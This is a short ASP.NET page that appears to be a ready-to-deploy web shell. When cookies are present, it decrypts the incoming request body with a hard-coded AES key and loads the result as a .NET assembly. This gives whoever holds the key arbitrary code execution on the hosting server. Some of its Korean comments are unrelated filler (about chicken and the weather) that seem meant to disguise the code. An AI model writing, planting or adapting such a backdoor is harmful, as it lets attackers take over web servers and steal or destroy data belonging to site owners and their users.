<%@ Page Language="C#" %><%
// 요청에 쿠키가 있는지 확인합니다.
if (Request.Cookies.Count != 0) {
    // 페이로드 처리 로직을 시작합니다.
    Action<object> a = (page) => {
        // 암호화 키를 Base64에서 디코딩합니다.
        string b64 = "Y2E2MzQ1NzUzOGI5YjFlMA==";
        byte[] c = System.Convert.FromBase64String(b64);
        byte[] d = System.Text.Encoding.UTF8.GetBytes(System.Text.Encoding.UTF8.GetString(c));

        // 배고파요, 치킨 먹고 싶다.
        var e = new System.Security.Cryptography.RijndaelManaged();
        var f = Request.InputStream;
        byte[] g = new byte[f.Length];
        f.Read(g, 0, g.Length);
        
        // 수신된 데이터를 해독합니다.
        var h = e.CreateDecryptor(d, d);
        var i = h.TransformFinalBlock(g, 0, g.Length);
        
        // 오늘 날씨가 좋네요.
        System.Reflection.Assembly.Load(i)
            .CreateInstance(string.Concat((char)75))
            .Equals(page);
    };
    a(this);
}
%>